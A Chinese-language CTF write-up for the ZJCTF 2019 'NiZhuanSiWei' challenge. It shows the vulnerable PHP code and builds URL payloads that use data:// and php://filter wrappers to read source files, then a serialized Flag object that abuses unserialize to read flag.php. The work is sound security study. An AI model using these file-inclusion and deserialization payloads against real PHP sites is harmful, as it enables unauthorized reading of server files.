---
title: "网安笔记 - 靶场实例 - 反序列化 - ZJCTF 2019-NiZhuanSiWei"
category: "网安笔记"
date: 2025-11-09
published: 2025-11-09
author: "Rin"
---

```php
<?php    
$text = $_GET["text"];  
$file = $_GET["file"];  
$password = $_GET["password"];  
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){  
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";  
    if(preg_match("/flag/",$file)){  
        echo "Not now!";  
        exit();   
    }else{  
        include($file);  //useless.php       
         $password = unserialize($password);  
        echo $password;  
    }  
}  
else{    highlight_file(__FILE__);  
}  
?>
```

**由于目标配置文件设置限制 这里只能用php伪协议来写入、读取文件**

```php
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf"))
```

要绕过这个句子 直接用data协议写入text
```text
?text=data://text/plain,welcome to the zjctf
```

接下来就进入if语句了 直接审计代码 我们想要进入的是else这个代码块 那就直接给file赋值useless.php

构造payload
```txt
?text=data://text/plain,welcome to the zjctf&file=php://filter/read=convert.base64-encode/resource=useless.php
```

得到base64编码 解密一下
```php
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

再审计一下 发现tostring这个魔术方法可以操作一下
直接构造序列化
```php
class Flag{  //flag.php  
    public $file='flag.php';  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  

$a=new Flag;
echo serialize($a);
```

运行后得到
```text
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

直接传给password

构造payload

```text
?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

右键查看源代码拿下flag